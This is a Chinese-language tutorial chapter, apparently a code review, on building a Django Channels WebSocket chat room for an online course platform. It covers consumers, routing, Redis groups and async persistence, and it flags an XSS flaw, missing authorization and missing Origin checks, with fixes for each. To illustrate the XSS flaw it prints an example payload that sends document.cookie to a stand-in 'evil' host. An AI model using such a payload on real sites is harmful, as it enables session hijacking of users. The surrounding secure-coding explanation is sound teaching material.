第 16 章 · 项目四：在线学习平台

聊天服务器

给每门课程开一个实时聊天室：学生发出的消息要立刻出现在所有同学的屏幕上。 传统的“请求—响应”做不到服务器主动推送，这一章引入 ASGI、WebSocket 和 Django Channels， 用 Redis 做通道层实现广播，把消费者改成全异步，最后把消息存进数据库形成聊天记录。

本章目标

  • 理解 WSGI 与 ASGI、HTTP 与 WebSocket 的区别
  • 安装 Channels 与 Daphne，用 ProtocolTypeRouter 组织 ASGI 应用
  • 编写 WebSocket 消费者（consumer）和路由
  • 用 json_script 安全地把数据交给 JavaScript，编写 WebSocket 客户端
  • 用 Redis 通道层和“组”实现广播；把消费者改写为异步
  • 用异步 ORM（acreate）持久化消息并显示历史

消费者与路由

消费者（consumer）之于 WebSocket，就像视图之于 HTTP。不同的是它是长寿的：一个连接从建立到断开，一直是同一个消费者实例在处理。

from django.urls import re_path

from . import consumers

websocket_urlpatterns = [
    re_path(r'ws/chat/room/(?P<course_id>\d+)/$', consumers.ChatConsumer.as_asgi()),
]
💡 两个小约定

WebSocket 的 URL 以 /ws/ 开头，方便生产环境的 Nginx 按路径把它们转给 Daphne；Channels 路由用 re_path 而不是 path，避免外层中间件包装时出现匹配问题。

ⓘ 为什么用 json_script

直接写 const name = '{{ request.user.username }}'; 看似可以，但用户名里一旦含有 </script> 或引号，就能跳出字符串执行任意脚本。json_script 会把值编码成 JSON 并转义危险字符，放进一个 type="application/json" 的 script 标签里，是官方推荐的安全做法。

异步消费者（最终版本）

import json

from channels.generic.websocket import AsyncWebsocketConsumer
from django.utils import timezone

from chat.models import Message


class ChatConsumer(AsyncWebsocketConsumer):
    async def connect(self):
        self.user = self.scope['user']                              # AuthMiddlewareStack 提供
        self.id = self.scope['url_route']['kwargs']['course_id']    # 来自 URL
        self.room_group_name = f'chat_{self.id}'
        await self.channel_layer.group_add(self.room_group_name, self.channel_name)
        await self.accept()

    async def disconnect(self, close_code):
        await self.channel_layer.group_discard(self.room_group_name, self.channel_name)

    async def persist_message(self, message):
        await Message.objects.acreate(user=self.user, course_id=self.id, content=message)

    async def receive(self, text_data):                              # 从浏览器收到
        message = json.loads(text_data)['message']
        now = timezone.now()
        await self.channel_layer.group_send(self.room_group_name, {
            'type': 'chat_message',                                  # 决定调用哪个方法
            'message': message,
            'user': self.user.username,
            'datetime': now.isoformat(),
        })
        await self.persist_message(message)

    async def chat_message(self, event):                             # 从组里收到
        await self.send(text_data=json.dumps(event))

做得好 异步消费者 + 异步 ORM + json_script

最终版本完全异步，通道层调用和数据库写入都用 await；页面向 JS 传值用 json_script；历史消息查询用了 select_related('user')；ASGI 入口里先 get_asgi_application() 再导入路由的顺序也正确。

有问题 实时消息通过 innerHTML 插入 —— 存储型 XSS Chapter16/educa/chat/templates/chat/room.html

历史消息由 Django 模板渲染（自动转义），但新消息在 JavaScript 里用 innerHTML += … + data.message 直接拼接。 任何同学发送 <img src=x onerror="fetch('//evil/?c='+document.cookie)">，所有在线的人浏览器里都会执行它。 书中提到可以用 nh3 在入库前清洗，但前端的问题更直接：不要把不可信文本当 HTML 插入。 

chatSocket.onmessage = function(event) {

有问题 WebSocket 连接没有做任何授权 chat/consumers.py:10

HTTP 视图检查了“必须登录且选了这门课”，但消费者的 connect() 无条件 accept()。 任何人只要知道 /ws/chat/room/3/ 就能连上、偷听所有消息；未登录用户发消息时 self.user 是 AnonymousUser，acreate 失败导致连接异常断开。 WebSocket 端点必须和 HTTP 端点做同样的权限检查： 

from channels.db import database_sync_to_async


class ChatConsumer(AsyncWebsocketConsumer):
    async def connect(self):
        self.user = self.scope['user']
        self.id = int(self.scope['url_route']['kwargs']['course_id'])
        if not self.user.is_authenticated or not await self.is_enrolled():
            await self.close(code=4403)
            return
        self.room_group_name = f'chat_{self.id}'
        await self.channel_layer.group_add(self.room_group_name, self.channel_name)
        await self.accept()

    async def is_enrolled(self):
        return await self.user.courses_joined.filter(id=self.id).aexists()

有问题 缺少 Origin 校验：跨站 WebSocket 劫持

浏览器发起 WebSocket 时会自动带上 Cookie，而 WebSocket 不受 CSRF 中间件保护。恶意网站可以用受害者的登录态连接你的聊天室。 Channels 文档要求用 AllowedHostsOriginValidator 包装 WebSocket 应用，只接受 ALLOWED_HOSTS 中的来源： 

from channels.security.websocket import AllowedHostsOriginValidator

application = ProtocolTypeRouter({
    'http': django_asgi_app,
    'websocket': AllowedHostsOriginValidator(
        AuthMiddlewareStack(URLRouter(websocket_urlpatterns))
    ),
})

建议改进 输入校验与协议细节

① json.loads(text_data)['message'] 遇到非 JSON 或缺少键就抛异常，连接被断开；没有长度限制，一条 10 MB 的消息会被广播并写库 —— 应校验类型、去空白、限制长度（比如 1000 字符），还可以按用户限速。 ② 客户端写死了 ws://，网站一上 HTTPS（第 17 章），浏览器会因“混合内容”拒绝连接，应写成 (location.protocol === 'https:' ? 'wss://' : 'ws://')。 ③ 断线后没有自动重连，可以在 onclose 里做指数退避重连。

补充知识 数据模型的取舍

on_delete=models.PROTECT 保护了聊天记录，但也意味着发过言的用户无法被删除 —— 面对“注销账号/被遗忘权”的需求时，可以改成 SET_NULL 并显示“已注销用户”。 历史查询按课程取最新消息，数据量大时应加索引：models.Index(fields=['course', '-sent_on'])。 另外，先广播后入库意味着入库失败时大家看到了一条“不存在”的消息，对聊天场景通常可以接受，对订单、支付等场景则应先落库再通知。

小结

  • WebSocket 提供持久的双向连接，需要 ASGI 服务器（Daphne）。
  • ProtocolTypeRouter 按协议分流；AuthMiddlewareStack 把会话中的用户放进 scope。
  • 消费者处理 connect / receive / disconnect；通道层的“组”实现广播。
  • 异步消费者配合异步 ORM（acreate 等）才能真正不阻塞。
  • WebSocket 端点同样需要认证、授权、Origin 校验和输入校验；前端插入内容用 textContent。
